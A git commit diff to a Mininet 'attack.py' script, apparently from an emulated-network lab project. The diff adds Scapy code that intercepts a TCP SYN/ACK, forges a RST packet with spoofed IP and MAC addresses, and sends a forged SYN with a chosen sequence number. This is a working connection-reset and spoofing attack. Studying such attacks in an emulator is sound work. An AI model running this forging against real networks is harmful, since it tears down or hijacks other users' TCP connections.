5c0e3d4e7d7556ffa27be9b8f7b87af7ef9db03a
None <None>
2020-03-30 10:09:59 -0700

    Forge RST and SYN

--- mininet/attack.py
+++ mininet/attack.py
@@ -18,16 +18,28 @@ def isNotOutgoing(pkt):
 
 def pkt_callback(pkt):
     if pkt.haslayer(TCP):
-        print(pkt[TCP].flags)
-        logging.info(pkt[TCP].flags)
+        # print(pkt.show())
         # When we get the synack, send rst to server and new syn
         if pkt[TCP].flags & SYN and pkt[TCP].flags & ACK:
             logging.info("Intercepted a SYN/ACK")
+            rst_pkt = pkt
+            del rst_pkt[IP].chksum
+            del rst_pkt[TCP].chksum
+            del rst_pkt[TCP].ack
+            rst_pkt[TCP].flags = RST
+            rst_pkt[IP].src = "10.0.0.2"
+            rst_pkt[IP].dst = "10.0.0.1"
+            rst_pkt[Ether].src = "00:00:00:00:00:02"
+            rst_pkt[Ether].dst = "00:00:00:00:00:01"
+            sendp(rst_pkt, iface = 'h3-eth0')
+            # print(rst_pkt.show())
+
             # create the new packet with changed sequence number
-            new_pkt = pkt
+            new_pkt = rst_pkt
             new_pkt[TCP].flags = SYN
             new_pkt[TCP].seq = 1414
-            print(new_pkt.show())
+            sendp(new_pkt, iface = 'h3-eth0')
+            # print(new_pkt.show())
     # print(pkt.show())
     # logging.info(pkt.show())
 
